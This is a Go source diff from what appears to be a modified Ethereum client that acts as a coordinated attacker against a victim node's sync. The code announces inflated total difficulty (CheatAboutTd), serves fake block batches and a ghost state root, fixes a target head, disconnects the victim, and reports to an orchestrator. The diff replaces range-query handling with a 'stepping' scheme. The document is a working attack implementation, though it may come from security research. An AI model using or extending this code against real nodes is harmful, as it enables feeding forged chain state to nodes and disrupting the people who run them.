@@ -39,7 +39,6 @@ var mustChangeAttackChain bool
 var quitLock sync.Mutex
 var victimLock sync.Mutex
 var fixHeadLock sync.Mutex
-var RangeQueryLock sync.Mutex
 var canServeLastFullBatch chan bool
 var canServePivoting chan bool
 var canDisconnect chan bool
@@ -71,6 +70,9 @@ var ancestorFound bool
 var fakeBatches chan types.Blocks
 var allFakeBatchesReceived bool
 var ghostRoot common.Hash
+var steppingBatches int
+var steppingDone bool
+var targetHead uint64
 var initialized bool
 
 
@@ -219,6 +221,8 @@ func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 		} else if attackPhase == utils.SyncPhase {
 			go stopMovingChecker()
 			go rollbackChecker()
+
+			steppingDone = true
 		}
 
 		log("Set victim:", vID)
@@ -418,136 +422,25 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 				*/
 				higherTd.Add(higherTd, bigOne)
 				victimLock.Unlock()
+
+				if lastOracleBit {
+					content := make([]byte, 8)
+					binary.BigEndian.PutUint64(content, latest(utils.TrueChain).Number.Uint64())
+					err := sendMessage(msg.CurrentHead.SetContent(content))
+					if err != nil {
+						fatal(err, "Could not send current head to orchestrator")
+					}
+					log("Sent current head")
+				}
 			}()
 		}
 	}
 }
 
-func ReceivedLastRangeQuery(origin common.Hash) bool {
-	/*
-	Upon receiving last query of state sync, we need to make the current syncOp fail.
-	To do so, we disconnect from the victim.
-	*/
-
-	if attackPhase != utils.SyncPhase {
-		//TODO: Don't simply return 'false' when attackPhase==DeliveryPhase, as the non-master peer
-		// when terminating state sync receives a last query which we had better drop to prevent the victim
-		// from reaching 100% sync. But maybe it is not necessary, we'll see later on by testing.
-		return false
-	}
-
-	rng := uint(origin.Bytes()[0]) >> 4
-	if !assignedRanges[rng] {
-		fatal(utils.StateError, "Received last range query of a range not assigned to us")
-	}
-	if completedRanges[rng] {
-		log("Range already completed, rng =", rng)
-	} else {
-		completedRanges[rng] = true
-		err := sendMessage(msg.CompletedRange.SetContent([]byte{byte(rng)}))
-		if err != nil {
-			fatal(err, "Could not notify range completion")
-		}
-	}
-
-	if !master {
-		err := sendMessage(msg.LastRangeQuery.SetContent(origin.Bytes()))
-		if err != nil {
-			fatal(err, "Could not notify range completion")
-		}
-	}
-
-	var allComplete bool
-	if master {
-		allComplete = checkRangeCompletion()
-	} else {
-		allComplete = <-dropAccountPacket
-	}
-
-	if allComplete {
-		// Victim's state sync reached 99%, import fake batches to update snapshot, but be sure that
-		// all fake batches have been received already.
-		go func() {
-			for !allFakeBatchesReceived {
-				time.Sleep(1*time.Second)
-			}
-			fakeBatches <- nil
-		}()
-	}
-	return allComplete
-}
-
-func checkRangeCompletion() bool {
-	allComplete := true
-	notComplete := make([]int, 0)
-	for idx, complete := range completedRanges {
-		if !complete && assignedRanges[idx] {
-			allComplete = false
-			notComplete = append(notComplete, idx)
-		}
-	}
-
-	if allComplete {
-		log("All range requests fulfilled")
-	} else {
-		log("Still to complete:", notComplete)
-	}
-
-	if !master && allComplete {
-		if victim == nil {
-			log("Victim should not be nil")
-			Close()
-			return false
-		}
-		victimLock.Lock()
-		terminatingStateSync = true
-		victim.Disconnect(p2p.DiscUselessPeer)
-		victimLock.Unlock()
-	}
-	return allComplete
-}
-
-func ReceivedRangeQuery(origin common.Hash) {
-	if attackPhase != utils.SyncPhase {
-		return
-	}
-	rng := uint(origin.Bytes()[0]) >> 4
-	if !assignedRanges[rng] {
-		log("Assigned new range, rng =", rng)
-		assignedRanges[rng] = true
-		err := sendMessage(msg.AssignedRange.SetContent([]byte{byte(rng)}))
-		if err != nil {
-			fatal(err, "Could not notify new range assignment")
-		}
-	}
-}
-
-func ResetRangeInfo() {
-	assignedRanges = make([]bool, 16)
-	completedRanges = make([]bool, 16)
-	log("Range info reset")
-	err := sendMessage(msg.ResetRangeInfo)
-	if err != nil {
-		fatal(err, "Couldn't notify reset range info to other peer")
-	}
-}
-
-/*
-func areAllBatchesServed() bool {
-	for _, served := range servedBatches {
-		if !served {
-			return false
-		}
-	}
-	return true
-}
-*/
-
 
 func GetAttackPhase() utils.AttackPhase {
 	return attackPhase
 }
-
 
 func DoingPrediction() bool {
 	select {
@@ -666,8 +559,10 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash,
 
 		if (attackPhase == utils.PredictionPhase && lastOracleBit) ||
 		   (attackPhase == utils.SyncPhase && !terminatingStateSync) {
-		   		if announcedSyncTD == nil {
-					td := new(big.Int).Add(getTd(utils.TrueChain), utils.DifficultySupplement)
+				if announcedSyncTD == nil {
+					diff := latest(utils.TrueChain).Difficulty
+					supplement := new(big.Int).Mul(diff, utils.BlockSupplement)
+					td := new(big.Int).Add(getTd(utils.TrueChain), supplement)
 					log("True TD in database (+suppl.):", td)
 					var head common.Hash
 					if fixedHead == 0 {
@@ -860,6 +755,10 @@ func MiniDelayBeforeServingBatch() {
 	time.Sleep(3000*time.Millisecond)
 }
 
+func SkeletonAndPivotingDelay() {
+	time.Sleep(938*time.Millisecond)
+}
+
 func WaitBeforePivoting() {
 	timeout := time.NewTimer(10*time.Second)
 	log("Waiting before pivoting")
@@ -882,15 +781,6 @@ func PivotingServed() {
 	}
 }
 
-
-func LastPartialBatchServed() {
-	go func() {
-		for !(attackPhase == utils.SyncPhase && terminatingStateSync) {
-			time.Sleep(100*time.Millisecond)
-		}
-		canDisconnect <- true
-	}()
-}
 
 func WaitBeforeLastFullBatch() {
 	<-canServeLastFullBatch
@@ -976,10 +866,9 @@ func stopMovingChecker() {
 
 		// Should work with ... >= 88 as well, but doesn't make a big difference
 		fixHeadLock.Lock()
-		if getTd(utils.TrueChain).Cmp(announcedSyncTD) >= 0 && (headNumber - skeletonStart)%utils.BatchSize > 88 &&
-		 pivot + 64 + 55 < headNumber {
+		if headNumber >= targetHead {
 			if fixedHead == 0 {
-				fixedHead = headNumber
+				fixedHead = targetHead
 				log("Fixed head for sync phase,", "number =", fixedHead)
 				headRlp, err := rlp.EncodeToBytes(head)
 				if err != nil {
@@ -1044,32 +933,6 @@ func SetPivot(pivotNumber uint64) {
 	headNumber := pivot + 64
 	head := getHeaderByNumber(chainType, headNumber)
 
-	fixHeadLock.Lock()
-	if getTd(utils.TrueChain).Cmp(announcedSyncTD) >= 0 && (headNumber - skeletonStart)%utils.BatchSize > 88 {
-		if fixedHead == 0 {
-			fixedHead = headNumber
-			log("Fixed head for sync phase,", "number =", fixedHead)
-			headRlp, err := rlp.EncodeToBytes(head)
-			if err != nil {
-				fatal(err, "Couldn't RLP-encode header")
-			}
-			err = sendMessage(msg.OriginalHead.SetContent(headRlp))
-			if err != nil {
-				fatal(err, "Couldn't send original head to orchestrator")
-			}
-			go func(h uint64) {
-					SendGhostRoot(h)
-				}(fixedHead)
-
-			r := head.Root
-			err = (*stateCache).TrieDB().Commit(r, true, nil)
-			if err != nil {
-				fatal(err, "Cannot commit root at fixedHead,", "fixedHead =", fixedHead, "root =", r)
-			}
-			log("Committed trie root, fixedHead =", fixedHead, ", root =", r)
-		}
-	}
-	fixHeadLock.Unlock()
 
 
 	// Shouldn't be necessary, but keep it commented for later maybe -- uncommented!
@@ -1101,9 +964,6 @@ func SetPivot(pivotNumber uint64) {
 			fatal(err, "Couldn't say to other peer to commit trie root at pivot")
 		}
 	}
-	RangeQueryLock.Lock()
-	ResetRangeInfo()
-	RangeQueryLock.Unlock()
 }
 
 func RootAtPivot() common.Hash {
@@ -1233,13 +1093,6 @@ func ProcessStepsAtSkeletonEnd(from uint64) {
 }
 
 func MustIgnoreBlock(number uint64) bool {
-	if fixedHead != 0 && (number-pivot) == (128 +16) {		// +16 to wait a little bit longer before assuming
-															// malicious peers are the only ones in the network
-															// which can serve the state to the victim.
-		RangeQueryLock.Lock()
-		ResetRangeInfo()
-		RangeQueryLock.Unlock()
-	}
 	if fixedHead != 0 && number > fixedHead+1 { 	// +1 to know stateRoot of following block for SNaP-Ghost
 		return true
 	}
@@ -1250,17 +1103,24 @@ func FakeBatchesToImport() chan types.Blocks {
 	return fakeBatches
 }
 
-func AllFakeBatchesImported() {
-	if !master {
-		if victim == nil {
-			log("Victim should not be nil")
-			Close()
-		}
-		victimLock.Lock()
-		terminatingStateSync = true
-		victim.Disconnect(p2p.DiscUselessPeer)
-		victimLock.Unlock()
+func SteppingDone() bool {
+	return steppingDone
+}
+
+func SteppingBatches() int {
+	return steppingBatches
+}
+
+func TerminatingStepping() {
+	err := sendMessage(msg.AvoidVictim.SetContent([]byte{0}))
+	if err != nil {
+		fatal(err, "Could not set avoidVictim to false for terminating stepping")
 	}
+}
+
+func EndOfStepping() {
+	steppingDone = true
+	master = false
 }
 
 func Close() {
@@ -1349,8 +1209,9 @@ func handleMessages() {
 					log("Switched to", attackPhase, "phase")
 				}
 				*/
-				if attackPhase != utils.DeliveryPhase {
+				if attackPhase != utils.DeliveryPhase && !(DoingPrediction() && lastOracleBit) {
 					avoidVictim = false
+					log("Setting avoidVictim = false")
 				}
 				victimLock.Unlock()
 			case msg.NewMaliciousPeer.Code:
@@ -1476,56 +1337,6 @@ func handleMessages() {
 					}
 					log("Committed trie root, fixedHead =", fixedHead, ", root =", r)
 				}(pivotNumber)
-			case msg.AssignedRange.Code:
-				go func() {
-					rng := uint(message.Content[0])
-					log("Trying to lock (msg.AssignedRange)")
-					RangeQueryLock.Lock()
-					assignedRanges[rng] = true
-					RangeQueryLock.Unlock()
-					log("Unlock (msg.AssignedRange)")
-				}()
-			case msg.CompletedRange.Code:
-				go func() {
-					rng := uint(message.Content[0])
-					log("Trying to lock (msg.CompletedRange)")
-					RangeQueryLock.Lock()
-					completedRanges[rng] = true
-					RangeQueryLock.Unlock()
-					log("Unlock (msg.CompletedRange)")
-				}()
-			case msg.LastRangeQuery.Code:
-				go func() {
-					if master {
-						var drop byte
-						log("Trying to lock (msg.LastRangeQuery)")
-						RangeQueryLock.Lock()
-						if ReceivedLastRangeQuery(common.BytesToHash(message.Content)) {
-							drop = 1
-						} else {
-							drop = 0
-						}
-						RangeQueryLock.Unlock()
-						log("Unlock (msg.LastRangeQuery)")
-						go func() {
-							err := sendMessage(msg.LastRangeQueryACK.SetContent([]byte{drop}))
-							if err != nil {
-								fatal(err, "Could not send ACK to LastRangeQuery message")
-							}
-						}()
-					}
-				}()
-			case msg.LastRangeQueryACK.Code:
-				go func() {
-					if !master {
-						switch (message.Content[0]) {
-						case 0:
-							dropAccountPacket <- false
-						case 1:
-							dropAccountPacket <- true
-						}
-					}
-				}()
 			case msg.GetCwd.Code:
 				path, err := os.Getwd()
 				if err != nil {
@@ -1535,17 +1346,10 @@ func handleMessages() {
 				if err != nil {
 					fatal(err, "Could not send current working directory")
 				}
-			case msg.ResetRangeInfo.Code:
-				go func() {
-					RangeQueryLock.Lock()
-					assignedRanges = make([]bool, 16)
-					completedRanges = make([]bool, 16)
-					RangeQueryLock.Unlock()
-					log("Range info reset")
-				}()
 			case msg.FakeBatch.Code:
 				if message.Content == nil || len(message.Content) == 0 {
 					allFakeBatchesReceived = true
+					fakeBatches <- nil
 					log("All fake batches received")
 				} else {
 					log("Fake batch arrived")
@@ -1558,6 +1362,12 @@ func handleMessages() {
 					}
 					fakeBatches <- blocks
 				}
+			case msg.SteppingBatches.Code:
+				steppingBatches = int(binary.BigEndian.Uint32(message.Content))
+				log("Set steppingBatches to", steppingBatches)
+			case msg.TargetHead.Code:
+				targetHead = binary.BigEndian.Uint64(message.Content)
+				log("Set targetHead to", targetHead)
 
 
 			/*
